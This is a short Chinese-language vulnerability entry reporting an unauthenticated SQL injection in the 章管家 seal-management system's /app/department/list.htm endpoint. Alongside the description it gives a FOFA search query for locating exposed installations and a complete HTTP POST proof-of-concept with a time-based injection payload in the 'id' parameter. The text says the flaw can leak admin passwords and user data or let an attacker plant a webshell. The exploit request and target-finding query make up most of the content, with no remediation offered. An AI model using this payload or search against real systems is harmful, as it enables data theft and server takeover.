# 章管家list.htm存在SQL注入漏洞

章管家 department/list.htm 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```javascript
body="章管家登录-公章在外防私盖"
```

## poc

```javascript
POST /app/department/list.htm HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Content-Type: application/x-www-form-urlencoded

token=dingtalk_token&person_id=1&unit_id=1&id=' or SL EEP(6) or '
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409132236104.png)